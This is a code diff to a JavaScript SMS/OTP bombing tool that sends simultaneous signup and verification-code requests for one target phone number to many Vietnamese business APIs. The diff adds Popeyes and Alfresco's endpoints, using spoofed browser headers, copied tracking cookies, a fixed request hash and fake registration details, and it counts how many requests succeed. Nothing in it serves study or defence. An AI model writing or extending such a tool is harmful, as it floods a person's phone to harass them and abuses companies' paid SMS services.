@@ -450,6 +450,65 @@ const payload = {
           'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
         };
 
+    const popeCookies = {
+          '_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE',
+          '_gcl_au': '1.1.2029065449.1703860145',
+          '_ga': 'GA1.1.1085625881.1703860163',
+          '_ga_GFJFDNFKH2': 'GS1.1.1703860162.1.0.1703860163.0.0.0',
+          '_fbp': 'fb.1.1703860165993.477455233',
+        };
+
+        const popeHeaders = {
+          'authority': 'api.popeyes.vn',
+          'accept': 'application/json',
+          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+          'content-type': 'application/json',
+          'dnt': '1',
+          'origin': 'https://popeyes.vn',
+          'ppy': 'ULWQDN',
+          'referer': 'https://popeyes.vn/',
+          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'same-site',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'x-client': 'WebApp',
+        };
+
+        const popeData = {
+          'phone': phone,
+          'firstName': 'tuoi',
+          'lastName': 'la',
+          'email': 'latuoi@gmail.com',
+          'password': 'cocailon',
+        };
+
+    const alfrescosHeaders = {
+          'Accept': 'application/json, text/plain, */*',
+          'Accept-Language': 'vi-VN',
+          'BrandCode': 'ALFRESCOS',
+          'Connection': 'keep-alive',
+          'Content-Type': 'application/json',
+          'DNT': '1',
+          'DeviceCode': 'web',
+          'Origin': 'https://alfrescos.com.vn',
+          'Referer': 'https://alfrescos.com.vn/',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        };
+
+        const alfrescosParams = {
+          culture: 'vi-VN',
+        };
+
+        const alfrescosData = {
+          phoneNumber: phone,
+          secureHash: '753d977024f8d805306e5078ad25a00a',
+          deviceId: '',
+          sendTime: 1703860383205,
+          type: 1,
+        };
             
 
     // Initial message to be edited later
@@ -517,13 +576,15 @@ const payload = {
         }), 
         axios.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', meeyIdData, { headers: meeyIdHeaders }),
         axios.post('https://api.onelife.vn/v1/gateway/', oneLifeData, { headers: oneLifeHeaders }),
+        axios.post('https://api.popeyes.vn/api/v1/register', data, { headers: popeHeaders, cookies: popeCookies, withCredentials: true }), 
+        axios.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', alfrescosData, { headers: alfrescosHeaders, params: alfrescosParams }), 
         ])
       .then(() => {
-        successCount += 14;
+        successCount += 16;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 14;
+        failureCount += 16;
         updateMessage();
       });
     };
